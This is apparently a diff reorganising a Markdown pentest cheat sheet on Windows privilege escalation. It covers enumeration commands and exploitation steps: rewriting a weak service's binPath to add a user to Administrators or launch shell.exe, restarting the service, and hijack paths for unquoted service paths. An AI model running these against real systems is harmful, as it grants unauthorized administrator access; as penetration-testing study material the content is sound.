@@ -213,42 +213,6 @@ schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Next Run Time" /C:"Last Run Time" /C:"Schedule Type" /C:"Start Time" /C:"Start Date"
 ```
 
-## Processes and Services
-
-``` bash
-tasklist /SVC
-```
-
-Active network connection
-
-``` bash
-netstat -ano
-```
-
-### Insecure Service Permissions
-
-``` bash
-sc qc Apache
-```
-
-``` bash
-accesschk64.exe -uwcqv <user> *
-```
-
-==> `Service All Access` or `Service Change Config`
-
-``` bash
-sc config "service" binPath= "net localgroup administrators user /add"
-```
-
-``` bash
-sc config "service" binPath= "c:\users\public\shell.exe"
-```
-
-[https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f](https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f)
-
-[https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219](https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219)
-
 ## Readable/Writable
 
 Using accesschk
@@ -271,17 +235,16 @@ Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match
 Get-ChildItem "C:\Users\windows_10_1903_x64\Desktop" -Recurse | Get-ACL | findstr /C:"<user-name>"
 ```
 
-### Leveraging Unquoted Paths
+## Processes and Services
 
 ``` bash
-wmic service get displayname,pathname
+tasklist /SVC
 ```
 
+Active network connection
+
 ``` bash
-C:\Program.exe
-C:\Program Files\My.exe
-C:\Program Files\My Program\My.exe
-C:\Program Files\My Program\My service\service.exe
+netstat -ano
 ```
 
 ### Insecure File Permissions
@@ -346,6 +309,8 @@ Check StartMode for service
 wmic service where caption="Serviio" get name, caption, state, startmode
 ```
 
+==> StartMode: Auto
+
 Check rights for restart system
 
 ``` bash
@@ -362,6 +327,51 @@ Check Administrators group
 
 ``` bash
 net localgroup Administrators
+```
+
+### Insecure Service Permissions
+
+``` bash
+sc qc "service"
+```
+
+``` bash
+accesschk64.exe -uwcqv <user> *
+```
+
+==> `Service All Access` or `Service Change Config`
+
+``` bash
+sc config "service" binPath= "net localgroup administrators user /add"
+```
+
+``` bash
+sc config "service" binPath= "c:\users\public\shell.exe"
+```
+
+``` bash
+sc stop "service"
+```
+
+``` bash
+sc start "service"
+```
+
+[https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f](https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f)
+
+[https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219](https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219)
+
+### Leveraging Unquoted Paths
+
+``` bash
+wmic service get displayname,pathname
+```
+
+``` bash
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
 ```
 
 ## Binaries That AutoElevate
